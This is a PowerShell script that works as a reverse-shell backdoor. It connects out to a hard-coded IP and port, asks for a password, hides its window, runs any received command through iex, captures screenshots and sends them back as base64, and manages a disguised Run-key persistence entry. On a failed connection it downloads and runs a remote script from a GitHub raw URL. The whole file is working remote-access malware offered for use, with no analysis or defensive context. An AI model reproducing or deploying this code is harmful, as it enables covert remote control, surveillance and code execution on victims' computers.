# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$pass = 'biskviti'
$reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$name = "WinDiag"

try {
    # 1. INITIAL CONNECTION
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    # 2. AUTHENTICATION CHALLENGE
    $w.WriteLine("AUTH:")
    if ($r.ReadLine() -eq $pass) {
        
        # 3. HIDE WINDOW (Only after successful login)
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        $w.WriteLine("--- PC ACCESS GRANTED TO: $env:COMPUTERNAME ---")

        # 4. MAIN COMMAND LOOP
        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim()

            # --- BRANCHING LOGIC ---
            if ($cmd -eq "exit") { break }
            
            elseif ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            }
            
            elseif ($cmd -eq "kill") {
                # THE SELF-DESTRUCT
                Remove-ItemProperty -Path $reg -Name $name -ErrorAction SilentlyContinue
                $w.WriteLine("[-] PERSISTENCE REMOVED. TERMINATING PROCESS...")
                $c.Close()
                exit
            }
            
            else {
                # STANDARD COMMAND EXECUTION
                iex $cmd 2>&1 | Out-String | %{ $w.WriteLine($_) }
            }
        }
    } else {
        # WRONG PASSWORD = AUTOMATIC KILL FOR SECURITY
        Remove-ItemProperty -Path $reg -Name $name -ErrorAction SilentlyContinue
        $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit
    }
    $c.Close()
} catch {
    # RETRY LOGIC (Sleep 120s if laptop is off)
    Start-Sleep -s 120
    $url = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1"
    iex (New-Object Net.WebClient).DownloadString($url)
}
